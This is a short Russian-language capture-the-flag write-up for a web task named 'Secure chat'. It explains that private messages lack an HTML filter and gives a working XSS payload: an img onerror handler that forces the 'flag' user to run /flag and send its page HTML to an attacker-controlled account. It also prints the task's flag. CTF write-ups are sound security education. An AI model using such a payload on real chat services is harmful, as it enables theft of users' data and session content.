# Secure chat - Web, 150 баллов [Дорешивание}
С чего стоит начать в таске с чатом? Конечно же с проверки на XSS! Однако, если мы попробуем вставить XSS-вектор в общий чат, нас просто отключат от сервера :(

Тогда смотрим, что еще можно делать в чате, и выясняем, что чат поддерживает личные сообщения. Отправляя личное сообщение самому себе примерно следующего содержания:
```
<b>123</b>
```
убеждаемся, что на личные сообщения такого фильтра не стоит. 

Давайте отправим ЛС пользователю `flag`, которое заставит его отправить команду `/flag`, после чего прислать нам содержимое своей странички (причем присылать будем на другой аккаунт - за ЛС такого характера нас просто выкинут с сервера). 

Отправляем в чат сообщение: 
```
/pm flag <img src=x onerror="javascript:sendMessage('/flag'); sendMessage('/pm asd '+document.documentElement.innerHTML);">
```

Смотрим сообщение, пришедшее к `asd`, ищем и сдаем флаг!

**Флаг:** `ytctf{This_should_not_happen_but_I_can_do_XSS_via_w3bs0ket_haha}`